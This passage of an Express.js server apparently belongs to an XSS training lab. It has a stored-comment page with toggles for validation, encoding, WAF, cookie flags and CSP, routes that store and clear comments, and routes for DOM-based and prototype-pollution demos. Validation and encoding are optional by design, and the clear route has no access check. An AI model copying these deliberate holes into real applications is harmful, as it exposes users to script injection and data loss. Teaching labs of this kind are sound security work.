            if (document.getElementById('serverValidationCheck').checked) params.set('serverValidation', 'true');
            if (document.getElementById('encodingCheck').checked) params.set('encoding', 'true');
            if (document.getElementById('wafCheck').checked) params.set('waf', 'true');
            if (document.getElementById('cookieFlagsCheck').checked) params.set('cookieFlags', 'true');
            const csp = document.getElementById('cspSelect').value;
            if (csp !== 'none') params.set('csp', csp);
            
            if (['block-forms', 'paranoid'].includes(csp)) {
              console.error('❌ CSP blocks ALL form submissions with form-action \\'none\\'');
              alert('⚠️ CSP Demonstration\\n\\nThe "' + csp + '" CSP uses form-action \\'none\\' which prevents ALL form submissions.\\n\\nThis demonstrates how CSP can completely block form-based attacks, but also breaks legitimate functionality.\\n\\nIn production, you would use form-action \\'self\\' to allow same-origin forms while blocking external submissions.');
              return;
            }
            
            const cspBlocksFetch = ['block-exfiltration', 'block-requests'].includes(csp);
            
            if (cspBlocksFetch) {
              console.log('⚠️ CSP blocks fetch() - using traditional form submission');
              const hiddenForm = document.createElement('form');
              hiddenForm.method = 'POST';
              hiddenForm.action = '/stored/comment';
              
              const commentField = document.createElement('input');
              commentField.type = 'hidden';
              commentField.name = 'comment';
              commentField.value = comment;
              hiddenForm.appendChild(commentField);
              
              ['clientValidation', 'serverValidation', 'encoding', 'waf', 'cookieFlags'].forEach(control => {
                const field = document.createElement('input');
                field.type = 'hidden';
                field.name = control;
                field.value = document.getElementById(control + 'Check').checked;
                hiddenForm.appendChild(field);
              });
              
              const cspField = document.createElement('input');
              cspField.type = 'hidden';
              cspField.name = 'csp';
              cspField.value = csp;
              hiddenForm.appendChild(cspField);
              
              document.body.appendChild(hiddenForm);
              hiddenForm.submit();
              return;
            }
            
            const formData = new FormData();
            formData.append('comment', comment);
            formData.append('clientValidation', document.getElementById('clientValidationCheck').checked);
            formData.append('serverValidation', document.getElementById('serverValidationCheck').checked);
            formData.append('encoding', document.getElementById('encodingCheck').checked);
            formData.append('waf', document.getElementById('wafCheck').checked);
            formData.append('cookieFlags', document.getElementById('cookieFlagsCheck').checked);
            formData.append('csp', document.getElementById('cspSelect').value);
            
            fetch('/stored/comment', {
              method: 'POST',
              body: formData
            }).then(response => {
              if (response.ok) {
                window.location.href = '/stored?' + params.toString();
              } else {
                return response.text().then(html => {
                  document.open();
                  document.write(html);
                  document.close();
                });
              }
            }).catch(error => {
              console.error('❌ Fetch blocked by CSP:', error);
              alert('CSP blocked the fetch request! This demonstrates how CSP can prevent data exfiltration. The app should have used a traditional form submission instead.');
            });
          }
        </script>
      </body>
      </html>
    `);
  });
});

app.post('/stored/comment', (req, res) => {
  const comment = req.body.comment;
  const serverValidation = req.body.serverValidation === 'true';
  
  const queryParams = new URLSearchParams({
    clientValidation: req.body.clientValidation,
    serverValidation: req.body.serverValidation,
    encoding: req.body.encoding,
    waf: req.body.waf,
    csp: req.body.csp,
    cookieFlags: req.body.cookieFlags
  }).toString();
  
  if (serverValidation && comment && !validateInput(comment)) {
    return res.status(400).send(`
      <html>
        <head>
          <title>Server Validation Failed</title>
          <link rel="stylesheet" href="/styles.css">
        </head>
        <body>
          <div class="container">
            <div class="error-box">
              <h1>⚠️ Server Validation Failed</h1>
              <p>The comment contains potentially dangerous content and was rejected by server-side validation.</p>
              <p><a href="/stored?${queryParams}">Go Back</a></p>
            </div>
          </div>
        </body>
      </html>
    `);
  }
  
  db.run('INSERT INTO comments (content) VALUES (?)', [comment], (err) => {
    if (err) {
      return res.status(500).send('Database error');
    }
    res.redirect('/stored?' + queryParams);
  });
});

app.post('/stored/clear', (req, res) => {
  db.run('DELETE FROM comments', [], (err) => {
    if (err) {
      return res.status(500).send('Database error');
    }
    res.sendStatus(200);
  });
});

app.get('/dom-based', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dom-based.html'));
});

app.get('/prototype-pollution', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'prototype-pollution.html'));
});


app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});

